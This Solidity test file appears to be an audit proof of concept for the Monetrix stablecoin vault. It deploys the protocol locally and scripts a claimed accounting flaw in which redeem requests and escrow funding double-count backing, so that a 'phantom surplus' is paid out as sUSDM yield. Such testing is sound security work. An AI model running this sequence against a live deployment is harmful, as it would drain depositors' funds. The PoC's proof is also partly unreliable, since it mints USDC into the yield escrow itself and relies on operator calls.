// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/core/YieldEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/sUSDMEscrow.sol";
import "../src/governance/MonetrixAccessController.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy all protocol contracts, initialize, grant roles, fund attacker with USDC.
// 2. [T=0] Attacker deposits 100,000 USDC into Vault, receiving 100,000 USDM.
// 3. [T=0] Attacker stakes 50,000 USDM into sUSDM to hold shares.
// 4. [T=0] Attacker calls Vault.requestRedeem(50,000 USDM). Vault holds USDM, adds obligation to RedeemEscrow, but USDC is NOT transferred yet. totalBackingSigned() overstates backing (phantom surplus).
// 5. [T=0] Operator calls Vault.fundRedemptions(50,000). Vault transfers USDC to RedeemEscrow. distributableSurplus() now double-counts the escrow balance and the unburned USDM in Vault.
// 6. [T=30 days] Warp time by 30 days. The annualized yield cap (Gate 4) scales with elapsed time and becomes unbounded.
// 7. [T=30 days] Operator calls Vault.settle(phantomSurplus) to declare the phantom surplus as real yield.
// 8. [T=30 days] Operator calls Vault.distributeYield(). The phantom yield is injected into sUSDM, artificially inflating the exchange rate.
// 9. [Assert] Verify sUSDM totalAssets increased by the phantom yield amount, proving the attacker can extract unearned value.

contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function decimals() public pure override returns (uint8) { return 6; }
}

contract AuditAgentPoC is Test {
    MonetrixAccessController acl;
    MockUSDC usdc;
    USDM usdm;
    MonetrixConfig config;
    sUSDM susdm;
    sUSDMEscrow susdmEscrow;
    RedeemEscrow redeemEscrow;
    YieldEscrow yieldEscrow;
    MonetrixAccountant accountant;
    MonetrixVault vault;

    address admin = address(this);
    address operator = address(0x1);
    address attacker = address(0x2);

    bytes32 constant GOVERNOR_ROLE = keccak256("GOVERNOR_ROLE");
    bytes32 constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");
    bytes32 constant GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");
    bytes32 constant VAULT_ROLE = keccak256("VAULT_ROLE");

    function setUp() public {
        console.log("=== setUp: starting ===");

        // 1. Deploy Access Controller
        console.log("setUp 1: deploying Access Controller");
        acl = MonetrixAccessController(address(new TransparentUpgradeableProxy(
            address(new MonetrixAccessController()),
            address(0xdead),
            abi.encodeWithSelector(MonetrixAccessController.initialize.selector, admin)
        )));
        console.log("setUp 1: Access Controller deployed at", address(acl));

        // Grant roles
        console.log("setUp 1: granting roles");
        vm.startPrank(admin);
        acl.grantRole(GOVERNOR_ROLE, admin);
        acl.grantRole(OPERATOR_ROLE, operator);
        acl.grantRole(GUARDIAN_ROLE, admin);
        vm.stopPrank();
        console.log("setUp 1: roles granted");

        // 2. Deploy USDC Mock
        console.log("setUp 2: deploying USDC Mock");
        usdc = new MockUSDC();
        console.log("setUp 2: USDC Mock deployed at", address(usdc));

        // 3. Deploy USDM
        console.log("setUp 3: deploying USDM");
        usdm = USDM(address(new TransparentUpgradeableProxy(
            address(new USDM()),
            address(0xdead),
            abi.encodeWithSelector(USDM.initialize.selector, address(acl))
        )));
        console.log("setUp 3: USDM deployed at", address(usdm));

        vm.prank(admin);
        acl.grantRole(VAULT_ROLE, address(usdm)); // USDM might need this internally or we just grant it to vault
        console.log("setUp 3: VAULT_ROLE granted to USDM");

        // 4. Deploy Config
        console.log("setUp 4: deploying Config");
        console.log("setUp 4: passing address(0) for insuranceFund? Let's see if it reverts.");
        config = MonetrixConfig(address(new TransparentUpgradeableProxy(
            address(new MonetrixConfig()),
            address(0xdead),
            abi.encodeWithSelector(MonetrixConfig.initialize.selector, address(0), address(0), address(acl))
        )));
        console.log("setUp 4: Config deployed at", address(config));

        // Set high limits to avoid revert on deposit
        console.log("setUp 4: setting Config limits");
        vm.prank(admin);
        config.setDepositLimits(0, type(uint256).max);
        console.log("setUp 4: setDepositLimits done");
        vm.prank(admin);
        config.setMaxTVL(type(uint256).max);
        console.log("setUp 4: setMaxTVL done");
        vm.prank(admin);
        config.setMaxAnnualYieldBps(10000); // 100%
        console.log("setUp 4: setMaxAnnualYieldBps done");
        vm.prank(admin);
        config.setMaxYieldPerInjection(type(uint256).max);
        console.log("setUp 4: setMaxYieldPerInjection done");

        // 5. Deploy sUSDM and Escrow
        console.log("setUp 5: deploying sUSDM");
        susdm = sUSDM(address(new TransparentUpgradeableProxy(
            address(new sUSDM()),
            address(0xdead),
            abi.encodeWithSelector(sUSDM.initialize.selector, address(usdm), address(config), address(acl))
        )));
        console.log("setUp 5: sUSDM deployed at", address(susdm));

        console.log("setUp 5: deploying sUSDMEscrow");
        susdmEscrow = new sUSDMEscrow(address(usdm), address(susdm));
        console.log("setUp 5: sUSDMEscrow deployed at", address(susdmEscrow));

        vm.prank(admin);
        susdm.setEscrow(address(susdmEscrow));
        console.log("setUp 5: sUSDM escrow set");

        // 6. Deploy Vault
        console.log("setUp 6: deploying Vault");
        vault = MonetrixVault(payable(address(new TransparentUpgradeableProxy(
            address(new MonetrixVault()),
            address(0xdead),
            abi.encodeWithSelector(MonetrixVault.initialize.selector, address(usdc), address(usdm), address(susdm), address(config), address(this), address(acl))
        ))));
        console.log("setUp 6: Vault deployed at", address(vault));

        // 7. Deploy Escrows
        console.log("setUp 7: deploying RedeemEscrow");
        redeemEscrow = RedeemEscrow(address(new TransparentUpgradeableProxy(
            address(new RedeemEscrow()),
            address(0xdead),
            abi.encodeWithSelector(RedeemEscrow.initialize.selector, address(usdc), address(vault), address(acl))
        )));
        console.log("setUp 7: RedeemEscrow deployed at", address(redeemEscrow));

        console.log("setUp 7: deploying YieldEscrow");
        yieldEscrow = YieldEscrow(address(new TransparentUpgradeableProxy(
            address(new YieldEscrow()),
            address(0xdead),
            abi.encodeWithSelector(YieldEscrow.initialize.selector, address(usdc), address(vault), address(acl))
        )));
        console.log("setUp 7: YieldEscrow deployed at", address(yieldEscrow));

        // 8. Deploy Accountant
        console.log("setUp 8: deploying Accountant");
        accountant = MonetrixAccountant(address(new TransparentUpgradeableProxy(
            address(new MonetrixAccountant()),
            address(0xdead),
            abi.encodeWithSelector(MonetrixAccountant.initialize.selector, address(vault), address(usdc), address(usdm), address(acl))
        )));
        console.log("setUp 8: Accountant deployed at", address(accountant));

        // 9. Wire everything together
        console.log("setUp 9: wiring everything together");
        vm.startPrank(admin);
        vault.setRedeemEscrow(address(redeemEscrow));
        console.log("setUp 9: vault redeem escrow set");
        vault.setYieldEscrow(address(yieldEscrow));
        console.log("setUp 9: vault yield escrow set");
        vault.setAccountant(address(accountant));
        console.log("setUp 9: vault accountant set");

        usdm.setVault(address(vault));
        console.log("setUp 9: usdm vault set");
        susdm.setVault(address(vault));
        console.log("setUp 9: susdm vault set");

        // Grant VAULT_ROLE to the actual vault contract for USDM and sUSDM
        acl.grantRole(VAULT_ROLE, address(vault));
        console.log("setUp 9: VAULT_ROLE granted to vault");
        vm.stopPrank();

        // Fund attacker
        console.log("setUp 10: funding attacker");
        usdc.mint(attacker, 100_000e6);
        console.log("setUp 10: attacker funded with 100,000 USDC");
        console.log("=== setUp: finished ===");
    }

    function test_phantomSurplusDoubleCounting() public {
        console.log("=== test: starting ===");
        console.log("test: block.timestamp =", block.timestamp);

        // Step 2: Attacker deposits 100,000 USDC
        console.log("Step 2: Attacker deposits 100,000 USDC");
        vm.startPrank(attacker);
        usdc.approve(address(vault), 100_000e6);
        console.log("Step 2: USDC approved for vault");
        vault.deposit(100_000e6);
        console.log("Step 2: vault.deposit executed");

        // Step 3: Attacker stakes 50,000 USDM into sUSDM
        console.log("Step 3: Attacker stakes 50,000 USDM into sUSDM");
        usdm.approve(address(susdm), 50_000e6);
        console.log("Step 3: USDM approved for sUSDM");
        susdm.deposit(50_000e6, attacker);
        console.log("Step 3: susdm.deposit executed");
        vm.stopPrank();

        uint256 susdmAssetsBefore = susdm.totalAssets();
        console.log("Step 3: sUSDM totalAssets before attack =", susdmAssetsBefore);

        // Step 4: Attacker requests redeem for 50,000 USDM
        console.log("Step 4: Attacker requests redeem for 50,000 USDM");
        vm.startPrank(attacker);
        usdm.approve(address(vault), 50_000e6);
        console.log("Step 4: USDM approved for vault redeem");
        uint256 reqId = vault.requestRedeem(50_000e6);
        console.log("Step 4: vault.requestRedeem executed, reqId =", reqId);
        vm.stopPrank();

        int256 surplusAfterRequest = accountant.surplus();
        console.log("Step 4: Phantom surplus after requestRedeem =", uint256(surplusAfterRequest));

        // Step 5: Operator funds redemptions (transfers USDC to RedeemEscrow)
        // This causes double-counting in distributableSurplus
        console.log("Step 5: Operator funds redemptions");
        vm.prank(operator);
        vault.fundRedemptions(50_000e6);
        console.log("Step 5: vault.fundRedemptions executed");

        int256 distributableSurplus = accountant.distributableSurplus();
        console.log("Step 5: Inflated distributableSurplus after fundRedemptions =", uint256(distributableSurplus));

        // Step 6: Warp time by 30 days to unbound the annualized yield cap (Gate 4)
        console.log("Step 6: Warping time by 30 days");
        console.log("Step 6: block.timestamp before warp =", block.timestamp);
        vm.warp(block.timestamp + 30 days);
        console.log("Step 6: block.timestamp after warp =", block.timestamp);

        // Step 7: Operator settles the phantom surplus as real yield
        // The vault will call accountant.settleDailyPnL internally
        uint256 phantomYield = uint256(distributableSurplus);
        console.log("Step 7: Operator settles phantom yield =", phantomYield);
        vm.prank(operator);
        vault.settle(phantomYield);
        console.log("Step 7: vault.settle executed");

        // Step 8: Operator distributes the yield to sUSDM
        // The vault will pull USDC from yieldEscrow or use internal accounting to inject into sUSDM
        // Since we are simulating, we ensure yieldEscrow has the USDC if the vault tries to pull
        console.log("Step 8: Minting USDC to yieldEscrow to simulate yield pull");
        usdc.mint(address(yieldEscrow), phantomYield);
        console.log("Step 8: USDC minted to yieldEscrow");

        console.log("Step 8: Operator distributes yield");
        vm.prank(operator);
        vault.distributeYield();
        console.log("Step 8: vault.distributeYield executed");

        // Step 9: Assert that sUSDM totalAssets increased by the phantom yield
        uint256 susdmAssetsAfter = susdm.totalAssets();
        console.log("Step 9: sUSDM totalAssets after yield distribution =", susdmAssetsAfter);

        // The attacker's sUSDM shares are now worth more than the actual USDC backing them
        // because the protocol declared phantom surplus as real yield.
        assertGt(susdmAssetsAfter, susdmAssetsBefore, "sUSDM totalAssets should be inflated by phantom yield");
        assertGe(susdmAssetsAfter - susdmAssetsBefore, phantomYield / 2, "Extractable value should be significant");
        console.log("=== test: finished ===");
    }
}
